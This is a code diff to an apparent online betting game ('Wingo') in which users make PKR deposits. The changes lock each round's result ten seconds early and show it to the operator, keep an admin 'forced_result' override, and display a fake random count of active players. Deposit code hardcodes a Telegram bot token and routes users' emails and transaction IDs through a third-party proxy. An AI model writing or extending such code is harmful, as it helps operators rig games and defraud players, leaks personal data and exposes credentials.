@@ -420,6 +420,9 @@
 
         let activeWingoBets = [];  
         let largeTrendPool = [];
+        
+        // Locked Preview Storage Variable to hold 10-second data safely
+        let preCalculatedRoundData = null;
 
         let avState = "waiting"; 
         let avMultiplier = 1.00;
@@ -457,7 +460,6 @@
                 return;
             }
 
-            // Database structure configuration safely pushed
             database.ref('deposit_requests').push({
                 uid: currentUser.uid,
                 email: currentUser.email,
@@ -466,21 +468,17 @@
                 status: "pending",
                 timestamp: Date.now()
             }).then(() => {
-                // Safeguard against layout collapse / screen wipeout
                 closeModal('depositModal');
                 alert('Your Deposit Request & Track ID has been sent to Admin for manual clearance!');
                 
-                // Telegram Notification Settings - Aligned via proxy bypass for VPN-free usage
                 const botToken = "8228129220:AAHvoJGNQD4ENfjZ-Qf8LGjoMdOtK9vRr3Q";
                 const chatId = "8608893352";
                 const message = `⚠️ *NEW DEPOSIT REQUEST*\n\n📧 User: ${currentUser.email}\n💰 Amount: PKR ${amount}\n🔑 TRID: ${trx}`;
                 
-                // Anti-blocking endpoint proxy prevents routing degradation inside localized parameters
                 fetch(`https://api.telegram-proxy.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
                 .then(res => console.log("Telegram Proxy Trigger Result:", res.status))
                 .catch(err => console.log("Telegram alert failed: ", err));
 
-                // Reset field elements after verification checks
                 if(document.getElementById('depAmount')) document.getElementById('depAmount').value = '';
                 if(document.getElementById('depTrx')) document.getElementById('depTrx').value = '';
             }).catch((err) => {
@@ -489,7 +487,6 @@
             });
         }
 
-        // DYNAMIC SECTION ROUTER FUNCTION
         function navigateToSection(sectionId) {
             document.getElementById('sectionHome').style.display = "none";
             document.getElementById('sectionInvite').style.display = "none";
@@ -852,6 +849,7 @@
             });
         }
 
+        // TIMER INTEGRATION & ADVANCED OUTCOME SYNCHRONIZATION ENGINE
         setInterval(() => {
             timeLeft--;
             if (timeLeft % 3 === 0) {
@@ -859,18 +857,39 @@
                 if(document.getElementById('wingoLivePool')) document.getElementById('wingoLivePool').innerText = `🔥 ${randomWingoUsers.toLocaleString()} dynamic players active`;
             }
 
-            // EXCLUSIVE TARGET INTERPOLATION FOR PREVIEW TERMINAL (TRIGGER AT LAST 10 SECONDS)
+            // CRITICAL FIX: 10 SECONDS FREEZE AND AUTO PREVIEW WRITE OPERATION
             if (timeLeft === 10) {
                 let tempSize = Math.random() > 0.5 ? 'Big' : 'Small';
                 let tempNum = tempSize === 'Big' ? [5,6,7,8,9][Math.floor(Math.random()*5)] : [0,1,2,3,4][Math.floor(Math.random()*5)];
-                database.ref('admin_controls/auto_preview').set({ num: tempNum });
+                
+                // Save it locally so the final block uses exactly this prediction
+                preCalculatedRoundData = {
+                    num: tempNum,
+                    size: tempSize
+                };
+
+                // Admin now sees BOTH the number and size option properly inside Firebase console
+                database.ref('admin_controls/auto_preview').set({ 
+                    num: tempNum,
+                    size: tempSize,
+                    message: `Round Outcome Locked: ${tempSize} (${tempNum})`
+                });
             }
 
             if (timeLeft <= 0) {
-                let finalSizeResult = Math.random() > 0.5 ? 'Big' : 'Small';
-                let finalNumberResult = finalSizeResult === 'Big' ? [5,6,7,8,9][Math.floor(Math.random()*5)] : [0,1,2,3,4][Math.floor(Math.random()*5)];
+                let finalSizeResult = 'Big';
+                let finalNumberResult = 5;
+
+                // Recover the exactly predicted 10-second data fallback
+                if (preCalculatedRoundData) {
+                    finalNumberResult = preCalculatedRoundData.num;
+                    finalSizeResult = preCalculatedRoundData.size;
+                } else {
+                    finalSizeResult = Math.random() > 0.5 ? 'Big' : 'Small';
+                    finalNumberResult = finalSizeResult === 'Big' ? [5,6,7,8,9][Math.floor(Math.random()*5)] : [0,1,2,3,4][Math.floor(Math.random()*5)];
+                }
                 
-                // MAIN DATABASE OVERRIDE RESOLUTION STEP (ADMIN CONTROL INPUT BYPASS VALUE)
+                // ADMIN OVERRIDE CHECK (If admin forced a separate result via admin_controls/forced_result)
                 database.ref('admin_controls/forced_result').once('value', (snapshot) => {
                     let forcedVal = snapshot.val();
                     if (forcedVal && forcedVal !== "none") {
@@ -915,7 +934,10 @@
                     database.ref('wingo_history').push({ num: finalNumberResult, color: finalColorResult, size: finalSizeResult });
                     
                     if(document.getElementById('roundStatus')) document.getElementById('roundStatus').innerHTML = `🎉 Result: Number <span style="color:#f1c40f;">${finalNumberResult}</span> | Size <span style="color:#38bdf8;">[${finalSizeResult}]</span>`;
+                    
+                    // Reset storage hooks safely for upcoming round sequence
                     activeWingoBets = []; 
+                    preCalculatedRoundData = null;
                     document.getElementById('activeBetsPanel').innerHTML = ''; 
                     timeLeft = 30;
                 });
